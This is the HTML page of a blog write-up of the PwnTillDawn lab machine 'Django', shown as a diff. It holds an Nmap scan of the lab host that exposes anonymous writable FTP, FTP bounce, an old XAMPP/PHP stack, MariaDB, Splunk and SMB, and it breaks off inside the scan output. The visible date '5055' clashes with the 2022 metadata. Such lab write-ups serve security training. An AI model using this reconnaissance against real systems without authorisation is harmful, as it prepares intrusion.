@@ -1,0 +1,1737 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='This is a writeup of the Django machine in PwnTillDawn Online platform.'><title>Django PwnTillDawn Writeup</title>
+
+<link rel='canonical' href='https://AbdallahAdham.com/p/django-pwntilldawn-writeup/'>
+
+<link rel="stylesheet" href="/scss/style.min.5a8e892f6fa14515e9065eee1f5d2e05302606ec7f11750b2fb95198f9cdcbfd.css"><meta property='og:title' content='Django PwnTillDawn Writeup'>
+<meta property='og:description' content='This is a writeup of the Django machine in PwnTillDawn Online platform.'>
+<meta property='og:url' content='https://AbdallahAdham.com/p/django-pwntilldawn-writeup/'>
+<meta property='og:site_name' content='Abdallah Adham'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='PwnTillDawn' /><meta property='article:tag' content='PenTesting' /><meta property='article:tag' content='Web' /><meta property='article:tag' content='Exploit' /><meta property='article:tag' content='Vulnerability' /><meta property='article:published_time' content='2022-12-05T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2022-12-05T00:00:00&#43;00:00'/><meta property='og:image' content='https://AbdallahAdham.com/post/Django_PwnTillDawn/django_pwntilldawn.JPG' />
+<meta name="twitter:title" content="Django PwnTillDawn Writeup">
+<meta name="twitter:description" content="This is a writeup of the Django machine in PwnTillDawn Online platform."><meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:image" content='https://AbdallahAdham.com/post/Django_PwnTillDawn/django_pwntilldawn.JPG' />
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/avatar_hu75263645e29a61b75309ab4d02f07e73_73571_300x0_resize_q75_box.jpg" width="300"
+                            height="249" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">Abdallah Adham</a></h1>
+            <h2 class="site-description">Penetration Tester</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://github.com/AbdallahAdham'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg width="16px" height="16px" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg">
+  <path fill-rule="evenodd" clip-rule="evenodd" d="M7.976 0A7.977 7.977 0 000 7.976c0 3.522 2.3 6.507 5.431 7.584.392.049.538-.196.538-.392v-1.37c-2.201.49-2.69-1.076-2.69-1.076-.343-.93-.881-1.175-.881-1.175-.734-.489.048-.489.048-.489.783.049 1.224.832 1.224.832.734 1.223 1.859.88 2.3.685.048-.538.293-.88.489-1.076-1.762-.196-3.621-.881-3.621-3.964 0-.88.293-1.566.832-2.153-.05-.147-.343-.978.098-2.055 0 0 .685-.196 2.201.832.636-.196 1.322-.245 2.007-.245s1.37.098 2.006.245c1.517-1.027 2.202-.832 2.202-.832.44 1.077.146 1.908.097 2.104a3.16 3.16 0 01.832 2.153c0 3.083-1.86 3.719-3.62 3.915.293.244.538.733.538 1.467v2.202c0 .196.146.44.538.392A7.984 7.984 0 0016 7.976C15.951 3.572 12.38 0 7.976 0z" fill="#000"/>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://www.linkedin.com/in/abdallah-adham/'
+                        target="_blank"
+                        title="Linkedin"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_801_">
+	<path id="XMLID_802_" d="M72.16,99.73H9.927c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5H72.16c2.762,0,5-2.238,5-5V104.73
+		C77.16,101.969,74.922,99.73,72.16,99.73z"/>
+	<path id="XMLID_803_" d="M41.066,0.341C18.422,0.341,0,18.743,0,41.362C0,63.991,18.422,82.4,41.066,82.4
+		c22.626,0,41.033-18.41,41.033-41.038C82.1,18.743,63.692,0.341,41.066,0.341z"/>
+	<path id="XMLID_804_" d="M230.454,94.761c-24.995,0-43.472,10.745-54.679,22.954V104.73c0-2.761-2.238-5-5-5h-59.599
+		c-2.762,0-5,2.239-5,5v199.928c0,2.762,2.238,5,5,5h62.097c2.762,0,5-2.238,5-5v-98.918c0-33.333,9.054-46.319,32.29-46.319
+		c25.306,0,27.317,20.818,27.317,48.034v97.204c0,2.762,2.238,5,5,5H305c2.762,0,5-2.238,5-5V194.995
+		C310,145.43,300.549,94.761,230.454,94.761z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/AbdallahAdham13'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <?xml version="1.0" encoding="iso-8859-1"?>
+<!-- Generator: Adobe Illustrator 19.0.0, SVG Export Plug-In . SVG Version: 6.00 Build 0)  -->
+<svg version="1.1" id="Layer_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px"
+	 viewBox="0 0 310 310" style="enable-background:new 0 0 310 310;" xml:space="preserve">
+<g id="XMLID_826_">
+	<path id="XMLID_827_" d="M302.973,57.388c-4.87,2.16-9.877,3.983-14.993,5.463c6.057-6.85,10.675-14.91,13.494-23.73
+		c0.632-1.977-0.023-4.141-1.648-5.434c-1.623-1.294-3.878-1.449-5.665-0.39c-10.865,6.444-22.587,11.075-34.878,13.783
+		c-12.381-12.098-29.197-18.983-46.581-18.983c-36.695,0-66.549,29.853-66.549,66.547c0,2.89,0.183,5.764,0.545,8.598
+		C101.163,99.244,58.83,76.863,29.76,41.204c-1.036-1.271-2.632-1.956-4.266-1.825c-1.635,0.128-3.104,1.05-3.93,2.467
+		c-5.896,10.117-9.013,21.688-9.013,33.461c0,16.035,5.725,31.249,15.838,43.137c-3.075-1.065-6.059-2.396-8.907-3.977
+		c-1.529-0.851-3.395-0.838-4.914,0.033c-1.52,0.871-2.473,2.473-2.513,4.224c-0.007,0.295-0.007,0.59-0.007,0.889
+		c0,23.935,12.882,45.484,32.577,57.229c-1.692-0.169-3.383-0.414-5.063-0.735c-1.732-0.331-3.513,0.276-4.681,1.597
+		c-1.17,1.32-1.557,3.16-1.018,4.84c7.29,22.76,26.059,39.501,48.749,44.605c-18.819,11.787-40.34,17.961-62.932,17.961
+		c-4.714,0-9.455-0.277-14.095-0.826c-2.305-0.274-4.509,1.087-5.294,3.279c-0.785,2.193,0.047,4.638,2.008,5.895
+		c29.023,18.609,62.582,28.445,97.047,28.445c67.754,0,110.139-31.95,133.764-58.753c29.46-33.421,46.356-77.658,46.356-121.367
+		c0-1.826-0.028-3.67-0.084-5.508c11.623-8.757,21.63-19.355,29.773-31.536c1.237-1.85,1.103-4.295-0.33-5.998
+		C307.394,57.037,305.009,56.486,302.973,57.388z"/>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+<g>
+</g>
+</svg>
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="has-image main-article">
+    <header class="article-header">
+        <div class="article-image">
+            <a href="/p/django-pwntilldawn-writeup/">
+                
+                    <img src="/post/Django_PwnTillDawn/django_pwntilldawn.JPG" loading="lazy" alt="Featured image of post Django PwnTillDawn Writeup" />
+                
+            </a>
+        </div>
+    
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/pen-testing/" style="background-color: #2a9d8f; color: #fff;">
+                Pen-Testing
+            </a>
+        
+            <a href="/categories/web-security/" style="background-color: #2a9d8f; color: #fff;">
+                Web-Security
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/django-pwntilldawn-writeup/">Django PwnTillDawn Writeup</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            This is a writeup of the Django machine in PwnTillDawn Online platform.
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">July 12, 5055</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    12 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <hr>
+<p>This writeup has been authorized by the <strong>PwnTillDawn Crew</strong>!</p>
+<p>Check their websites for more information!</p>
+<ol>
+<li><a class="link" href="https://www.wizlynxgroup.com/"  target="_blank" rel="noopener"
+    >wizlynxgroup</a></li>
+<li><a class="link" href="https://online.pwntilldawn.com/"  target="_blank" rel="noopener"
+    >online.pwntilldawn</a></li>
+</ol>
+<h2 id="target-information">Target Information</h2>
+<div class="table-wrapper"><table>
+<thead>
+<tr>
+<th>Name</th>
+<th>IP</th>
+<th>Operating System</th>
+<th>Difficulty</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><strong>Django</strong></td>
+<td><strong>10.150.150.212</strong></td>
+<td><strong>Windows</strong></td>
+<td><strong>Easy</strong></td>
+</tr>
+</tbody>
+</table></div>
+<h2 id="scanning">Scanning</h2>
+<h3 id="nmap-scanning">Nmap Scanning</h3>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span><span class="lnt">33
+</span><span class="lnt">34
+</span><span class="lnt">35
+</span><span class="lnt">36
+</span><span class="lnt">37
+</span><span class="lnt">38
+</span><span class="lnt">39
+</span><span class="lnt">40
+</span><span class="lnt">41
+</span><span class="lnt">42
+</span><span class="lnt">43
+</span><span class="lnt">44
+</span><span class="lnt">45
+</span><span class="lnt">46
+</span><span class="lnt">47
+</span><span class="lnt">48
+</span><span class="lnt">49
+</span><span class="lnt">50
+</span><span class="lnt">51
+</span><span class="lnt">52
+</span><span class="lnt">53
+</span><span class="lnt">54
+</span><span class="lnt">55
+</span><span class="lnt">56
+</span><span class="lnt">57
+</span><span class="lnt">58
+</span><span class="lnt">59
+</span><span class="lnt">60
+</span><span class="lnt">61
+</span><span class="lnt">62
+</span><span class="lnt">63
+</span><span class="lnt">64
+</span><span class="lnt">65
+</span><span class="lnt">66
+</span><span class="lnt">67
+</span><span class="lnt">68
+</span><span class="lnt">69
+</span><span class="lnt">70
+</span><span class="lnt">71
+</span><span class="lnt">72
+</span><span class="lnt">73
+</span><span class="lnt">74
+</span><span class="lnt">75
+</span><span class="lnt">76
+</span><span class="lnt">77
+</span><span class="lnt">78
+</span><span class="lnt">79
+</span><span class="lnt">80
+</span><span class="lnt">81
+</span><span class="lnt">82
+</span><span class="lnt">83
+</span><span class="lnt">84
+</span><span class="lnt">85
+</span><span class="lnt">86
+</span><span class="lnt">87
+</span><span class="lnt">88
+</span><span class="lnt">89
+</span><span class="lnt">90
+</span><span class="lnt">91
+</span><span class="lnt">92
+</span><span class="lnt">93
+</span><span class="lnt">94
+</span><span class="lnt">95
+</span><span class="lnt">96
+</span><span class="lnt">97
+</span><span class="lnt">98
+</span><span class="lnt">99
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.150.150.212
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.083s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">986</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT      STATE SERVICE      VERSION
+</span></span><span class="line"><span class="cl">21/tcp    open  ftp
+</span></span><span class="line"><span class="cl"><span class="p">|</span> fingerprint-strings: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   GenericLines: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     220-Wellcome to Home Ftp Server!
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server ready.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="nb">command</span> not understood.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="nb">command</span> not understood.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Help: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     220-Wellcome to Home Ftp Server!
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server ready.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     <span class="s1">&#39;HELP&#39;</span>: <span class="nb">command</span> not understood.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NULL, SMBProgNeg: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     220-Wellcome to Home Ftp Server!
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server ready.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   SSLSessionReq: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     220-Wellcome to Home Ftp Server!
+</span></span><span class="line"><span class="cl"><span class="p">|</span>     Server ready.
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    <span class="nb">command</span> not understood.
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-syst: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  SYST: Internet Component Suite
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ftp-anon: Anonymous FTP login allowed <span class="o">(</span>FTP code 230<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">26</span>  <span class="m">2019</span> . <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">26</span>  <span class="m">2019</span> .. <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> drw-rw-rw-   <span class="m">1</span> ftp      ftp            <span class="m">0</span> Mar <span class="m">13</span>  <span class="m">2019</span> FLAG <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> -rw-rw-rw-   <span class="m">1</span> ftp      ftp        <span class="m">34419</span> Mar <span class="m">26</span>  <span class="m">2019</span> xampp-control.log <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_-rw-rw-rw-   <span class="m">1</span> ftp      ftp          <span class="m">881</span> Nov <span class="m">13</span>  <span class="m">2018</span> zen.txt <span class="o">[</span>NSE: writeable<span class="o">]</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ftp-bounce: bounce working!
+</span></span><span class="line"><span class="cl">80/tcp    open  http         Apache httpd 2.4.34 <span class="o">((</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.34 <span class="o">(</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Welcome to XAMPP
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was http://10.150.150.212/dashboard/
+</span></span><span class="line"><span class="cl">135/tcp   open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">139/tcp   open  netbios-ssn  Microsoft Windows netbios-ssn
+</span></span><span class="line"><span class="cl">443/tcp   open  ssl/http     Apache httpd 2.4.34 <span class="o">((</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>localhost
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2009-11-10T23:48:47
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2019-11-08T23:48:47
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Apache/2.4.34 <span class="o">(</span>Win32<span class="o">)</span> OpenSSL/1.0.2o PHP/5.6.38
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> tls-alpn: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  http/1.1
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-title: Welcome to XAMPP
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Requested resource was https://10.150.150.212/dashboard/
+</span></span><span class="line"><span class="cl">445/tcp   open  microsoft-ds Windows <span class="m">7</span> Home Basic <span class="m">7601</span> Service Pack <span class="m">1</span> microsoft-ds <span class="o">(</span>workgroup: PWNTILLDAWN<span class="o">)</span>
+</span></span><span class="line"><span class="cl">3306/tcp  open  mysql        MariaDB <span class="o">(</span>unauthorized<span class="o">)</span>
+</span></span><span class="line"><span class="cl">8089/tcp  open  ssl/http     Splunkd httpd
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: Splunkd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> http-robots.txt: <span class="m">1</span> disallowed entry 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_/
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: splunkd
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>SplunkServerDefaultCert/organizationName<span class="o">=</span>SplunkUser
+</span></span><span class="line"><span class="cl"><span class="p">|</span> Not valid before: 2019-10-29T14:31:26
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_Not valid after:  2022-10-28T14:31:26
+</span></span><span class="line"><span class="cl">49152/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49153/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49154/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49155/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49157/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl">49158/tcp open  msrpc        Microsoft Windows RPC
+</span></span><span class="line"><span class="cl"><span class="m">1</span> service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+</span></span><span class="line"><span class="cl">SF-Port21-TCP:V<span class="o">=</span>7.93%I<span class="o">=</span>7%D<span class="o">=</span>11/14%Time<span class="o">=</span>63727F72%P<span class="o">=</span>x86_64-pc-linux-gnu%r<span class="o">(</span>NUL
+</span></span><span class="line"><span class="cl">SF:L,35,<span class="s2">&#34;220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n220\x20Server\x20
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:ready\.\r\n&#34;</span><span class="o">)</span>%r<span class="o">(</span>GenericLines,79,<span class="s2">&#34;220-Wellcome\x20to\x20Home\x20Ftp\x20S
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:erver!\r\n220\x20Server\x20ready\.\r\n500\x20&#39;\r&#39;:\x20command\x20not\x2
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0understood\.\r\n500\x20&#39;\r&#39;:\x20command\x20not\x20understood\.\r\n&#34;</span><span class="o">)</span>%r
+</span></span><span class="line"><span class="cl">SF:<span class="o">(</span>Help,5A,<span class="s2">&#34;220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n220\x20Server
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\x20ready\.\r\n500\x20&#39;HELP&#39;:\x20command\x20not\x20understood\.\r\n&#34;</span><span class="o">)</span>%r
+</span></span><span class="line"><span class="cl">SF:<span class="o">(</span>SSLSessionReq,89,<span class="s2">&#34;220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n220\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:x20Server\x20ready\.\r\n500\x20&#39;\x16\x03\0\0S\x01\0\0O\x03\0\?G\xd7\xf7
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:\xba,\xee\xea\xb2`~\xf3\0\xfd\x82{\xb9\xd5\x96\xc8w\x9b\xe6\xc4\xdb&lt;=\x
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:dbo\xef\x10n\0\0\(\0\x16\0\x13\0&#39;:\x20command\x20not\x20understood\.\r\
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:n&#34;</span><span class="o">)</span>%r<span class="o">(</span>SMBProgNeg,35,<span class="s2">&#34;220-Wellcome\x20to\x20Home\x20Ftp\x20Server!\r\n22
+</span></span></span><span class="line"><span class="cl"><span class="s2">SF:0\x20Server\x20ready\.\r\n&#34;</span><span class="o">)</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">Service Info: Hosts: Wellcome, DJANGO<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Host script results:
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-os-discovery: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS: Windows <span class="m">7</span> Home Basic <span class="m">7601</span> Service Pack <span class="m">1</span> <span class="o">(</span>Windows <span class="m">7</span> Home Basic 6.1<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   OS CPE: cpe:/o:microsoft:windows_7::sp1
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Computer name: Django
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   NetBIOS computer name: DJANGO<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   Workgroup: PWNTILLDAWN<span class="se">\x</span><span class="m">00</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  System time: 2022-11-14T18:33:30+00:00
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-time: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   date: 2022-11-14T18:33:32
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  start_date: 2020-04-02T14:41:43
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_clock-skew: mean: 41m34s, deviation: 40s, median: 41m10s
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb2-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   210: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_    Message signing enabled but not required
+</span></span><span class="line"><span class="cl"><span class="p">|</span> smb-security-mode: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   account_used: &lt;blank&gt;
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   authentication_level: user
